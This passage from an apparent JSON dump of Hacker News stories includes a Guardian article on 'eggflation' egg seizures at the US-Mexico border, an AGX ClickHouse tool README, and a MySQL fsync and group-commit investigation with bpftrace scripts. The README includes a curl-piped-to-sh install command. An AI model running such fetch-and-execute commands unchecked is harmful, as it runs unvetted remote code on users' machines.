inside, so if you want case assignment you can write:\n\n          |x| = { x, if x >= 0 ; -x, otherwise :}\n\n              {: a, b; c, d :}\n              {: \\] {:a, b; c, d:} \\[ :}\n\n[λ_0, λ_1, ...;] [p_(0 0), p_(0 1), ...\n                  p_(1 0), p_(1 1), ...\n                  vdots,   vdots,   ddots]\n\n              1 / ad-bc [d, -b; -c, a]\n\n                  ||bf x||^2 = [x_1; x_2; x_3] * [x_1; x_2; x_3]\n\nn! = { 1,       if n=0 or n=1\n       n(n-1)!, if n > 1\n\n                  det A = |(a, b; c, d)| = ad - bc\n\n          Tensors and Indices\n\n            To write tensors or any other complex indices you can start a group\n            with either a hat ^ or an underscore\n            _ character. The following expression will be your first\n            upper or lower index respectively. Every following ^ or\n            _ will start a new index A(^b_c) for\n\n                A cb\n               . If you want your index on a new column you can add a\n            , before the ^ or _:\n            A(^b,_c)\n\n                A b c\n               . You can repeat the previous index position by omitting the\n            ^ or _ after a comma:\n            A(_b,c,d,^e,f,g)\n\n                A b c\n                d e f g\n               .\n\n            You can also add prescripts by immediately following with an\n            expression. [^14_6]rm C\n\n                C  614\n\n            or both (^n)P(_k)\n\n                P k  n\n               . Prescripts take priority.\n\n            If you want to add sub- or superscripts to your indices, you can\n            surround the entire index with parenthesis\n            A(^(a_i),...,(a_n)) ⇒\n\n                A ai\n                …\n                an\n               . And if you want to use a comma or a parenthesis as an index, you\n            can escape it with a backslash \\\n            A(_beta, \\,, \\[, a)\n\n                A β,\n                [a\n               .\n\n              (^a_b^c_d)E(^f_g^h_i)\n              (_a,^b,_c,^d)E(^f,_g,^h,_i)\n              Gamma(^mu, _nu, _rho)\n\n                  delta(^\\[ ^(alpha_1)_(beta_1)) ... delta(^(alpha_p)_(beta_p) ^\\])\n\n                  (bf it B')(^i,_j) = sum_k sum_l bf it B(^k,_l) delta(^i,l) delta(_k,j)\n\n          Roots\n\n            MathML has <msqrt> and\n            <mroot> tags for roots. Mathup similarly provides\n            sqrt x and root n x (or\n            root(n, x) if you prefer) for the squared root of\n            x and the n-th root of x respectively.\n\n              phi = 1+sqrt5 / 2\n\n                  x = -b+-sqrt(b^2 - 4ac) / 2a\n\n                  rho = (root(3, 108 + 12 sqrt 69) + root(3, 108 - 12 sqrt 69)) / 6\n\n                  sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+cdots\n\n          Accents\n\n            The following commands will add accents over or under the following\n            expression or add other types of highlighting:\n\n            Accents\n\n              hat a\n\n                  a^\n\n              bar a\n\n                  a‾\n\n              vec a\n\n                  a→\n\n              dot a\n\n                  a⋅\n\n              ddot a\n\n                  a⋅⋅\n\n              tilde a\n\n                  a˜\n\n              ul a\n\n                  a_\n\n              oparen a+b\n\n                    a+b\n                    ⏜\n\n              uparen a+b\n\n                    a+b\n                    ⏝\n\n              obrace a+b\n\n                    a+b\n                    ⏞\n\n              ubrace a+b\n\n                    a+b\n                    ⏟\n\n              obracket a+b\n\n                    a+b\n                    ⎴\n\n              ubracket a+b\n\n                    a+b\n                    ⎵\n\n              oshell a+b\n\n                    a+b\n                    ⏠\n\n              ushell a+b\n\n                    a+b\n                    ⏡\n\n              cancel a+b\n\n                    a+b\n\n                  bar x = 1/n sum_(i=0)^n x_i\n\n                  vec x = a hat i + b hat j + c hat k\n\n              X -> x + tilde x\n\n                  oparen a+b uparen c+d oshell e+f ushell g+h obracket i+j ubracket k+l\n\n          Font commands\n\n            You can prefix any expression with a font command. Then all token\n            elements in that expression will have the following variant. Some\n            variants can be combined, order doesn’t matter.\n\n            Bold (bf), italic (it), sans-serif\n            (sf), and monospace (tt) on texts (bf tt \"text\") are set using CSS. If you want to control the font-family of\n            sans-serif and monospace texts, you can set the\n            CSS custom properties\n            --mathup-font-family-sans-serif and\n            --mathup-font-family-monospace\n            respectively.\n\n            Font Commands\n\n              rm\n\n                  normal\n\n              bf\n\n                  bold\n\n              it\n\n                  italic\n\n              bf it\n\n                  bold italic\n\n              bb\n\n                  𝕕𝕠𝕦𝕓𝕝𝕖-𝕤𝕥𝕣𝕦𝕔𝕜\n\n              cc\n\n                  𝓈𝒸𝓇𝒾𝓅𝓉\n\n              bf cc\n\n                  𝓼𝓬𝓻𝓲𝓹𝓽\n\n              fr\n\n                  𝔣𝔯𝔞𝔠𝔱𝔲𝔯\n\n              bf fr\n\n                  𝖋𝖗𝖆𝖈𝖙𝖚𝖗\n\n              sf\n\n                  𝗌𝖺𝗇𝗌-𝗌𝖾𝗋𝗂𝖿\n\n              bf sf\n\n                  𝘀𝗮𝗻𝘀-𝘀𝗲𝗿𝗶𝗳\n\n              it sf\n\n                  𝘴𝘢𝘯𝘴-𝘴𝘦𝘳𝘪𝘧\n\n              bf it sf\n\n                  𝙨𝙖𝙣𝙨-𝙨𝙚𝙧𝙞𝙛\n\n              tt\n\n                  𝚖𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎\n\n                  bb`1`_({x in X})\n\n                  it`proj`_(bf v) bf a = (bf a*v) / (norm(bf v)^2) bf v\n\n                  bb E[X] = int_(-oo)^oo x f(x) bb it \\d x\n\n          Colors\n\n            You can change the color or background of a portion of your\n            experssion simply by typing that color. Backgrounds are prefixed by\n            bg.<colorname>. If you don’t like that color\n            variant, you can overwrite it using the\n            --mathup-color-<colorname> or\n            --mathup-background-<colorname>\n            CSS custom properties. For example:\n\n            If you have an emoji keyboard you can use the colored circle emoji\n            (🔴🟠🟡🟢🔵🟣🟤) for color and the colored square emoji\n            (🟥🟧🟨🟩🟦🟪🟫) for the background. Black and white circles use the\n            medium variant (⚫⚪), and black and white square use the large\n            variant (⬛⬜).\n\n          :root {\n  --mathup-color-red: lch(50% 130 20);\n  --mathup-background-green: lch(50% 132 180);\n}\n\n          See below for available colors\n\n            Colors\n\n              red, 🔴\n\n                Red\n\n              orange, 🟠\n\n                Orange\n\n              yellow, 🟡\n\n                Yellow\n\n              green, 🟢\n\n                Green\n\n              cyan\n\n                Cyan\n\n              blue, 🔵\n\n                Blue\n\n              purple, 🟣\n\n                Purple\n\n              brown, 🟤\n\n                Brown\n\n              black, ⚫\n\n                Black\n\n              gray\n\n                Gray\n\n              lightgray\n\n                Lightgray\n\n              white, ⚪\n\n                White\n\n            Backgrounds\n\n              bg.red, 🟥\n\n                Red\n\n              bg.orange, 🟧\n\n                Orange\n\n              bg.yellow, 🟨\n\n                Yellow\n\n              bg.green, 🟩\n\n                Green\n\n              bg.cyan\n\n                Cyan\n\n              bg.blue, 🟦\n\n                Blue\n\n              bg.purple, 🟪\n\n                Purple\n\n              brown, 🟫\n\n                Brown\n\n              bg.black, ⬛\n\n                Black\n\n              bg.gray\n\n                Gray\n\n              bg.lightgray\n\n                Lightgray\n\n              bg.white, ⬜\n\n                White\n\n                cancel red 1+1\n\n                🟥⚪bf A + 🟦⚪bf B\n\n                bg.black white norm bf a\n\n                { a - -b, bg.lightgray tt\"a - -b\"\n  a - it`−b`, bg.lightgray tt\"a - it`−b`\"\n\n                  \"🫶\" = 🟥♥🟧♥🟨♥🟩⚪♥🟦⚪♥🟪⚪♥",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5871a04c53f991bc",
    "title": {
      "en": "Cake is watching you: I built a camera cake",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://medium.com/@hazalmestci/interact-with-your-cake-and-eat-it-too-24d25da25017",
    "score": 48,
    "by": "hazalmestci",
    "time": 1742406299,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "80d26d5aa7eee205",
    "title": {
      "en": "Chunking Attacks on File Backup Services Using Content-Deﬁned Chunking [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.daemonology.net/blog/chunking-attacks.pdf",
    "score": 115,
    "by": "cperciva",
    "time": 1742578234,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ee58c3e73bfc3e13",
    "title": {
      "en": "'Eggflation' sending US shoppers to Mexico – where $300 fines await",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.theguardian.com/us-news/2025/mar/21/eggflation-us-mexico-fines",
    "score": 35,
    "by": "paulpauper",
    "time": 1742670820,
    "content": "A sign in a Costco warehouse in Sheridan, Colorado, on 13 March 2025. Photograph: David Zalubowski/APView image in fullscreenA sign in a Costco warehouse in Sheridan, Colorado, on 13 March 2025. Photograph: David Zalubowski/APUS-Mexico border‘Eggflation’ sending US shoppers to Mexico – where $300 fines await‘Egg interceptions’ are up more than 150% at some ports of entry as a US avian flu outbreak fuels shortagesKatharine Gammon in Los AngelesFri 21 Mar 2025 10.00 GMTLast modified on Fri 21 Mar 2025 21.39 GMTShareIn grocery stores across the US, egg shelves sitting empty and desolate have become a sign of the times. A surging bird flu outbreak affected nearly 19 million birds in January alone, wiping out supply and sending prices soaring.Officials forecast a 41% increase in egg prices this year in what some are calling “eggflation”. Where eggs are available, consumers are often limited in the number they can purchase at a time. Breakfast chains from Waffle House to Denny’s have added a surcharge of $0.50 for each egg served up.The situation is driving some people to new places to source their eggs: over the southern border. US Customs and Border Protection (CBP) has intercepted an increasing number of eggs from Mexico, where a carton of a dozen costs about $2. For comparison, the cost in many parts of California is just under $10 per dozen, according to the United States Department of Agriculture.Nationally, there has been a 48% increase in eggs being detained at ports of entry this fiscal year compared with the same time last fiscal year, according to CBP. In San Diego, these “egg interception” cases have increased by a whopping 158%.Every day, more than 200,000 cars cross the border from Mexico to the United States. Some of those cars carry groceries, medications and other goods that are less expensive over the southern border.“It’s very common for people to shop for their groceries on the Mexican side and bring them across,” said Joaquin Luken, executive director of the Smart Border Coalition, a group that helps facilitate cross-border mobility. “So a lot of them bring dry produce materials that they buy on the Mexican side.”But the problems start with fresh items – especially eggs. Importing raw or fresh eggs into the US from Mexico is prohibited due to concerns about diseases such as highly pathogenic avian influenza – also known as bird flu – and another highly contagious avian illness called virulent Newcastle disease, said Roger Maier, a public affairs specialist with CBP.And it’s not just eggs. Travelers are prohibited from bringing raw chicken, unprocessed avian products and live birds into the United States, Maier said. Even used egg cartons can spread the same diseases. There are some exceptions for fully cooked egg products.That’s why anyone with agricultural products has to declare them to border officers and agriculture specialists. “Failure to declare may lead to potential fines and penalties,” said Maier. He added that most of the eggs being confiscated by border agriculture specialists are from travelers who declared the product and then abandoned them without consequence.“There have been very few cases of people purposefully evading the inspection process/failing to declare the product,” he said. “When that happens, a $300 civil penalty is applied, and the eggs are seized.”Once confiscated, the eggs are destroyed by officials in oven-sized incinerators. Repeat offenders can be fined up to $10,000.skip past newsletter promotionSign up to Headlines USFree newsletterGet the most important US headlines and highlights emailed direct to you every morningEnter your email address Sign upPrivacy Notice: Newsletters may contain info about charities, online ads, and content funded by outside parties. For more information see our Privacy Policy. We use Google reCaptcha to protect our website and the Google Privacy Policy and Terms of Service apply.after newsletter promotionLuken advises shoppers to always check the CBP’s social media sites, because items that are allowed at one time may change and be prohibited when conditions such as disease outbreaks occur in the US.Other countries are stepping up to help the egg shortage: Turkey has agreed to sell 15,000 tons of eggs to the US through July. South Korea has also signed on to sell eggs to the US, but the myriad laws and regulations in each country around eggs makes it complicated. The USDA secretary, Brooke Rollins, said she was talking to other countries. “We continue to work on that issue very, very aggressively in the short term,” she said in a press conference on Thursday, “to keep getting the price of eggs down.”That leaves Americans still struggling for their egg fix, making the southern border an attractive option.Most people are not trying to skirt the laws, Maier said. But they may not know the requirements: always let the officials know whether you have fresh items, he advised. “The vast majority of egg intercepts are from travelers who declare them when asked,” he said.Explore more on these topicsUS-Mexico borderEggsBird fluUS economyFoodnewsShareReuse this contentMost viewedMark Carney to announce Canadian election and will run in Ottawa’s Nepean ridingUnited pilot attacked passenger for taking too long in the bathroom, lawsuit allegesThe Trump administration is descending into authoritarianismTurkey’s protests over Istanbul mayor grow into ‘fight about democracy’Trump revokes security clearances for Biden, Harris and other political enemies",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6de557499066e0d5",
    "title": {
      "en": "Show HN: AGX – Open-Source Data Exploration for ClickHouse (The New Standard?)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/agnosticeng/agx",
    "score": 44,
    "by": "didierfranc",
    "time": 1742395874,
    "content": "agx\nagx is a desktop application that lets you explore and query data through a modern interface. It's built with Tauri, SvelteKit and Plot, and can work in two ways: as a native desktop app using ClickHouse's embedded database (chdb), or as a web interface connected to a Clickhouse server instance.\nPreview\n\nFeatures\n\nNative desktop application performance with web technologies\nInteractive SQL query editor with syntax highlighting\nSchema browser for exploring data structure\nResults displayed in a tabular format\nSupport for drag & drop file operations\nCross-platform compatibility (macOS, Linux, Windows)\n\nPrerequisites\n\nNode.js (v16 or later)\nRust toolchain\nSystem dependencies for Tauri\n\nGetting Started\n→ Native (chdb)\nGet the latest release from GitHub.\n→ Live (clickhouse)\nhttps://agx.app\n→ Local (clickhouse)\n\nClone the repository:\n\ngit clone https://github.com/agnosticeng/agx && cd agx\n\nRun with docker compose:\n\ndocker compose up\n\nAccess the application via http://localhost:8080\n\nProject Structure\nagx/\n├── src/                 # Frontend source code (SvelteKit)\n│   ├── lib/             # Shared components\n│   └── routes/          # Application routes\n├── src-tauri/           # Backend source code (Rust)\n│   ├── src/             # Rust source files\n│   └── Cargo.toml       # Rust dependencies\n├── package.json         # Node.js dependencies\n└── README.md\n\nInstalling Agnostic UDF\nInstall Agnostic ClickHouse UDFs with a single command:\ncurl -fsSL https://raw.githubusercontent.com/agnosticeng/agx/main/scripts/install_agnostic_udfs.sh | sh\n\nDevelopment\n\nThe frontend is built with SvelteKit, offering a reactive and efficient UI\nThe backend uses Tauri with Rust, providing native performance and security\nCommunication between frontend and backend happens through Tauri's IPC bridge\nData querying is handled by chdb, an embedded ClickHouse engine\n\nContributing\nContributions are welcome! Please feel free to submit a Pull Request.\nLicense\nThis project is licensed under the MIT License - see the LICENSE file for details.\nThe MIT License is one of the most popular open-source licenses because it:\n\nIs simple and permissive\nAllows commercial use\nAllows modification and distribution\nAllows private use\nHas minimal restrictions\nIs compatible with many other licenses",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "95cb9bc8cf450a2f",
    "title": {
      "en": "Use Long Options in Scripts",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://matklad.github.io/2025/03/21/use-long-options-in-scripts.html",
    "score": 262,
    "by": "OptionOfT",
    "time": 1742587020,
    "content": "Use Long Options in Scripts Mar 21, 2025\nMany command line utilities support short form options (-f) and long form options (--force).\nShort form is for interactive usage. In scripts, use the long form.\nThat is, in your terminal, type $ git switch -c my-new-branch\nIn your release infrastructure script, write\n\ntry shell.exec(\"git fetch origin --quiet\", .{});\ntry shell.exec(\n    \"git switch --create release-{today} origin/main\",\n    .{ .today = stdx.DateUTC.now() },\n);\n\nLong form options are much more self-explanatory for the reader.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "8cd333a959895658",
    "title": {
      "en": "MySQL transactions per second vs. fsyncs per second (2020)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second",
    "score": 109,
    "by": "jcartw",
    "time": 1742591919,
    "content": "MySQL transactions per second vs fsyncs per secondself.__wrap_b=(t,n,e)=>{e=e||document.querySelector(`[data-br=\"${t}\"]`);let s=e.parentElement,r=R=>e.style.maxWidth=R+\"px\";e.style.maxWidth=\"\";let o=s.clientWidth,i=s.clientHeight,c=o/2-.25,l=o+.5,u;if(o){for(;c+1<l;)u=Math.round((c+l)/2),r(u),s.clientHeight===i?l=u:c=u;r(l*n+o*(1-n))}e.__wrap_o||(e.__wrap_o=new ResizeObserver(()=>{self.__wrap_b(0,+e.dataset.brr,e)})).observe(s)};self.__wrap_b(\":Rj8m:\",1)Jul 2020Just wondering how many transactions or writes per second MySQL can handle? While it depends on many factors, fundamentally, about as many transactions as MySQL can commit to disk per second. A modern disk can do ~1000 fsyncs per second, but MySQL will group multiple writes with each fsync. An okay rule-of-thumb would be 5000-15,000 writes per second, depending on things like writes per transaction, number of indexes, hardware, size of writes, etc. Read the article to understand this in more depth!Table of ContentsProblem 10: Is MySQL’s maximum transactions per second equivalent to fsyncs per second?Problem 9: Inverted IndexNapkin friends, from near and far, it’s time for another napkin problem!\nSince the beginning of this newsletter I’ve posed problems for you to try to\nanswer. Then in the next month’s edition, you hear my answer. Talking with a few\nof you, it seems many of you read these as posts regardless of their\nproblem-answer format.\nThat’s why I’ve decided to experiment with a simpler format: posts where I both\npresent a problem and solution in one go. This one will be long, since it’ll\ninclude an answer to last month’s.\nHope you enjoy this format! As always, you are encouraged to reach out with\nfeedback.\nProblem 10: Is MySQL’s maximum transactions per second equivalent to fsyncs per second?\nHow many transactions (‘writes’) per second is MySQL capable of?\nA naive model of how a write (a SQL insert/update/delete) to an ACID-compliant\ndatabase like MySQL works might be the following (this applies equally to\nPostgres, or any other relational/ACID-compliant databases, but we’ll\nproceed to work with MySQL as it’s the one I know best):\n\nClient sends query to MySQL over an existing connection: INSERT INTO products (name, price) VALUES ('Sneaker', 100)\nMySQL inserts the new record to the write-ahead-log (WAL) and calls\nfsync(2) to tell the operating system to tell the filesystem to tell the\ndisk to make sure that this data is for sure, pinky-swear committed to\nthe disk. This step, being the most complex, is depicted below.\nMySQL inserts the record into an in-memory page in the backing storage engine\n(InnoDB) so the record will be visible to subsequent queries. Why commit to\nthe storage engine and the WAL? The storage engine is optimized for serving\nquery results the data, and the WAL for writing it in a safe manner — we\ncan’t serve a SELECT efficiently from the WAL!\nMySQL returns OK to the client.\nMySQL eventually calls fsync(2) to ensure InnoDB commits the page to disk.\n\nIn the event of power-loss at any of these points, the behaviour can be defined\nwithout nasty surprises, upholding our dear ACID-compliance.\nSplendid! Now that we’ve constructed a naive model of how a relational database\nmight handle writes safely, we can consider the latency of inserting a new\nrecord into the database. When we consult the reference napkin numbers, we\nsee that the fsync(2) in step (2) is by far the slowest operation in the\nblocking chain at 1 ms.\nFor example, the network handling at step (1) takes roughly ~10 μs (TCP Echo\nServer is what we can classify as ‘the TCP overhead’). The write(2) itself\nprior to the fsync(2) is also negligible at ~10 μs, since this system call\nessentially just writes to an in-memory buffer (the ‘page cache’) in the kernel.\nThis doesn’t guarantee the actual bits are committed on disk, which means an\nunexpected loss of power would erase the data, dropping our ACID-compliance on\nthe floor. Calling fsync(2) guarantees us the bits are persisted on the disk,\nwhich will survive an unexpected system shutdown.  Downside is that it’s 100x\nslower.\nWith that, we should be able to form a simple hypothesis on the maximum\nthroughput of MySQL:\n\nThe maximum theoretical throughput of MySQL is equivalent to the maximum\nnumber of fsync(2) per second.\n\nWe know that fsync(2) takes 1 ms from earlier, which means we would naively\nexpect that MySQL would be able to perform in the neighbourhood of: 1s / 1ms/fsync = 1000 fsyncs/s = 1000 transactions/s .\nExcellent. We followed the first three of the napkin math steps: (1) Model the\nsystem, (2) Identify the relevant latencies, (3) Do the napkin math, (4) Verify\nthe napkin calculations against reality.\nOn to (4: Verifying)! We’ll write a simple benchmark in Rust that writes to\nMySQL with 16 threads, doing 1,000 insertions each:\nfor i in 0..16 {\n    handles.push(thread::spawn({\n        let pool = pool.clone();\n        move || {\n            let mut conn = pool.get_conn().unwrap();\n            // TODO: we should ideally be popping these off a queue in case of a stall\n            // in a thread, but this is likely good enough.\n            for _ in 0..1000 {\n                conn.exec_drop(\n                    r\"INSERT INTO products (shop_id, title) VALUES (:shop_id, :title)\",\n                    params! { \"shop_id\" => 123, \"title\" => \"aerodynamic chair\" },\n                )\n                .unwrap();\n            }\n        }\n    }));\n\n    for handle in handles {\n      handle.join().unwrap();\n    }\n    // 3 seconds, 16,000 insertions\n}\n\nThis takes ~3 seconds to perform 16,000 insertions, or ~5,300 insertions per\nsecond. This is 5x more than the 1,000 fsync per second our napkin math\ntold us would be the theoretical maximum transactional throughput!\nTypically with napkin math we aim for being within an order of magnitude, which\nwe are. But, when I do napkin math it usually establishes a lower-bound for the\nsystem, i.e. from first-principles, how fast could this system perform in\nideal circumstances?\nRarely is the system 5x faster than napkin math. When we identify a\nsignificant-ish gap between the real-life performance and the expected\nperformance, I call it the “first-principle gap.” This is where curiosity sets\nin. It typically means there’s (1) an opportunity to improve the system, or (2)\na flaw in our model of the system. In this case, only (2) makes sense, because\nthe system is faster than we predicted.\nWhat’s wrong with our model of how the system works? Why aren’t fsyncs per\nsecond equal to transactions per second?\nFirst I examined the benchmark… is something wrong? Nope SELECT COUNT(*) FROM products says 16,000. Is the MySQL I’m using configured to not fsync on every\nwrite? Nope, it’s at the safe default.\nThen I sat down and thought about it. Perhaps MySQL is not doing an fsync\nfor every single write? If it’s processing 5,300 insertions per second,\nperhaps it’s batching multiple writes together as part of writing to the WAL,\nstep (2) above? Since each transaction is so short, MySQL would benefit from\nwaiting a few microseconds to see if other transactions want to ride along\nbefore calling the expensive fsync(2).\nWe can test this hypothesis by writing a simple bpftrace script to observe the\nnumber of fsync(1) for the ~16,000 insertions:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == \"mysqld\"/\n{\n        @fsyncs = count();\n}\n\nRunning this during the ~3 seconds it takes to insert the 16,000 records we get\n~8,000 fsync calls:\n$ sudo bpftrace fsync_count.d\nAttaching 2 probes...\n^C\n\n@fsyncs: 8037\n\nThis is a peculiar number. If MySQL was batching fsyncs, we’d expect something\nfar lower. This number means that we’re on average doing ~2,500 fsync per\nsecond, at a latency of ~0.4ms. This is twice as fast as the fsync latency we\nexpect, the 1ms mentioned earlier. For sanity, I ran the script to benchmark\nfsync outside MySQL again, no, still 1ms. Looked at the\ndistribution, and it was consistently ~1ms.\nSo there’s two things we can draw from this: (1) We’re able to fsync more than\ntwice as fast as we expect, (2) Our hypothesis was correct that MySQL is more\nclever than doing one fsync per transaction, however, since fsync also was\nfaster than expected, this didn’t explain everything.\nIf you remember from above, while committing the transaction could theoretically\nbe a single fsync, other features of MySQL might also call fsync. Perhaps\nthey’re adding noise?\nWe need to group fsync by file descriptor to get a better idea of how MySQL\nuses fsync. However, the raw file descriptor number doesn’t tell us much. We\ncan use readlink and the proc file-system to obtain the file name the file\ndescriptor points to. Let’s write a bpftrace script to see what’s being\nfsync‘ed:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == str($1)/\n{\n  @fsyncs[args->fd] = count();\n  if (@fd_to_filename[args->fd]) {\n  } else {\n    @fd_to_filename[args->fd] = 1;\n    system(\"echo -n 'fd %d -> ' &1>&2 | readlink /proc/%d/fd/%d\",\n           args->fd, pid, args->fd);\n  }\n}\n\nEND {\n  clear(@fd_to_filename);\n}\n\nRunning this while inserting the 16,000 transactions into MySQL gives us:\npersonal@napkin:~$ sudo bpftrace --unsafe fsync_count_by_fd.d mysqld\nAttaching 5 probes...\nfd 5 -> /var/lib/mysql/ib_logfile0 # redo log, or write-ahead-log\nfd 9 -> /var/lib/mysql/ibdata1 # shared mysql tablespace\nfd 11 -> /var/lib/mysql/#ib_16384_0.dblwr # innodb doublewrite-buffer\nfd 13 -> /var/lib/mysql/undo_001 # undo log, to rollback transactions\nfd 15 -> /var/lib/mysql/undo_002 # undo log, to rollback transactions\nfd 27 -> /var/lib/mysql/mysql.ibd # tablespace\nfd 34 -> /var/lib/mysql/napkin/products.ibd # innodb storage for our products table\nfd 99 -> /var/lib/mysql/binlog.000019 # binlog for replication\n^C\n\n@fsyncs[9]: 2\n@fsyncs[12]: 2\n@fsyncs[27]: 12\n@fsyncs[34]: 47\n@fsyncs[13]: 86\n@fsyncs[15]: 93\n@fsyncs[11]: 103\n@fsyncs[99]: 2962\n@fsyncs[5]: 4887\n\nWhat we can observe here is that the majority of the writes are to the “redo\nlog”, what we call the “write-ahead-log” (WAL). There’s a few fsync calls to\ncommit the InnoDB table-space, not nearly as often, as we can always recover\nthis from the WAL in case we crash between them. Reads work just fine prior to\nthe fsync, as the queries can simply be served out of memory from InnoDB.\nThe only surprising thing here is the substantial volume of writes to the\nbinlog, which we haven’t mentioned before. You can think of the binlog as the\n“replication stream.” It’s a stream of events such as row a changed from x to y, row b was deleted, and table u added column c. The primary replica\nstreams this to the read-replicas, which use it to update their own data.\nWhen you think about it, the binlog and the WAL need to be kept exactly in\nsync. We can’t have something committed on the primary replica, but not\ncommitted to the replicas. If they’re not in sync, this could cause loss of data\ndue to drift in the read-replicas. The primary could commit a change to the WAL,\nlose power, recover, and never write it to the binlog.\nSince fsync(1) can only sync a single file-descriptor at a time, how can you\npossibly ensure that the binlog and the WAL contain the transaction?\nOne solution would be to merge the binlog and the WAL into one log. I’m not\nentirely sure why that’s not the case, but likely the reasons are historic. If\nyou know, let me know!\nThe solution employed by MySQL is to use a 2-factor commit. This requires three\nfsyncs to commit the transaction. This and this reference explain\nthis process in more detail. Because the WAL is touched twice as part of the\n2-factor commit, it explains why we see roughly ~2x the number of fsync to\nthat over the bin-log from the bpftrace output above. The process of grouping\nmultiple transactions into one 2-factor commit in MySQL is called ‘group commit.’\nWhat we can gather from these numbers is that it seems the ~16,000 transactions\nwere, thanks to group commit, reduced into ~2885 commits, or ~5.5 transactions\nper commit on average.\nBut there’s still one other thing remaining… why was the average latency per\nfsync twice as fast as in our benchmark? Once again, we write a simple\nbpftrace script:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == \"mysqld\"/\n{\n        @start[tid] = nsecs;\n}\n\ntracepoint:syscalls:sys_exit_fsync,tracepoint:syscalls:sys_exit_fdatasync\n/comm == \"mysqld\"/\n{\n        @bytes = lhist((nsecs - @start[tid]) / 1000, 0, 1500, 100);\n        delete(@start[tid]);\n}\n\nWhich throws us this histogram, confirming that we’re seeing some very fast\nfsyncs:\npersonal@napkin:~$ sudo bpftrace fsync_latency.d\nAttaching 4 probes...\n^C\n\n@bytes:\n[0, 100)             439 |@@@@@@@@@@@@@@@                                     |\n[100, 200)             8 |                                                    |\n[200, 300)             2 |                                                    |\n[300, 400)           242 |@@@@@@@@                                            |\n[400, 500)          1495 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[500, 600)           768 |@@@@@@@@@@@@@@@@@@@@@@@@@@                          |\n[600, 700)           376 |@@@@@@@@@@@@@                                       |\n[700, 800)           375 |@@@@@@@@@@@@@                                       |\n[800, 900)           379 |@@@@@@@@@@@@@                                       |\n[900, 1000)          322 |@@@@@@@@@@@                                         |\n[1000, 1100)         256 |@@@@@@@@                                            |\n[1100, 1200)         406 |@@@@@@@@@@@@@@                                      |\n[1200, 1300)         690 |@@@@@@@@@@@@@@@@@@@@@@@@                            |\n[1300, 1400)         803 |@@@@@@@@@@@@@@@@@@@@@@@@@@@                         |\n[1400, 1500)         582 |@@@@@@@@@@@@@@@@@@@@                                |\n[1500, ...)         1402 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    |\n\nTo understand exactly what’s going on here, we’d have to dig into the\nfile-system we’re using. This is going to be out of scope (otherwise I’m never\ngoing to be sending anything out). But, to not leave you completely hanging,\npresumably, ext4 is using techniques similar to MySQL’s group commit to batch\nwrites together in the journal (equivalent to the write-ahead-log of MySQL). In\next4’s vocabulary, this seems to be called max_batch_time, but the\ndocumentation on this is scanty at best. The disk could also be doing this in\naddition/instead of the file-system. If you know more about this, please\nenlighten me!\nThe bottom-line is that fsync can perform faster during real-life workloads than the\n1 ms I obtain on this machine from repeatedly writing and fsyncing a file. Most\nlikely from the ext4 equivalent of group commit, which we won’t see on a\nbenchmark that never does multiple fsyncs in parallel.\nThis brings us back around to explaining the discrepancy between real-life and\nthe napkin-math of MySQL’s theoretical, maximum throughput. We are able to\nachieve an at least 5x increase in throughput from raw fsync calls due to:\n\nMySQL merging multiple transactions into fewer fsyncs through ‘group commits.’\nThe file-system and/or disk merging multiple fsyncs performed in parallel\nthrough its own ‘group commits’, yielding faster performance.\n\nIn essence, the same technique of batching is used at every layer to improve\nperformance.\nWhile we didn’t manage to explain everything that’s going on here, I certainly\nlearned a lot from this investigation. It’d be interesting light of this to play\nwith changing the group commit settings to optimize MySQL for throughput over\nlatency. This could also be tuned at the file-system level.\nProblem 9: Inverted Index\nLast month, we looked at the inverted\nindex. This data-structure is what’s\nbehind full-text search, and the way the documents are packed works well for set\nintersections.\n\n(A) How long do you estimate it’d take to get the ids for title AND see with 2\nmillion ids for title, and 1 million for see?\nLet’s assume that each document id is stored as a 64-bit integer. Then we’re\ndealing with 1 * 10^6 * 64bit = 8 Mb and 2 * 10^6 * 64 bit = 16 Mb. If we\nuse an exceptionally simple set intersection algorithm of essentially two nested\nfor-loops, we need to scan ~24Mb of sequential memory. According to the\nreference, we can do this in 1Mb/100us * 24Mb = 2.4ms.\nStrangely, the Lucene nightly benchmarks are performing these queries at\nroughly 22 QPS, or 1000ms/22 = 45ms per query. That’s substantially worse than\nour prediction. I was ready to explain why Lucene might be faster (e.g. by\ncompressing postings to less than 64-bit), but not why it might be 20x slower!\nWe’ve got ourselves another first-principle gap.\nSome slowness can be due to reading from disk, but since the access pattern is\nsequential, it should only be 2-3x slower. The hardware could be different\nthan the reference, but hardly anything that’d explain 20x. Sending the data to\nthe client might incur a large penalty, but again, 20x seems enormous. This type\nof gap points towards missing something fundamental (as we saw with MySQL).\nUnfortunately, this month I didn’t have time to dig much deeper than this, as I\nprioritized the MySQL post.\n(B) What about title OR see?\nIn this case we’d have to scan roughly as much memory, but handle more documents\nand potentially transfer more back to the client. We’d expect to roughly be in\nthe same ballpark for performance ~2.4ms.\nLucene in 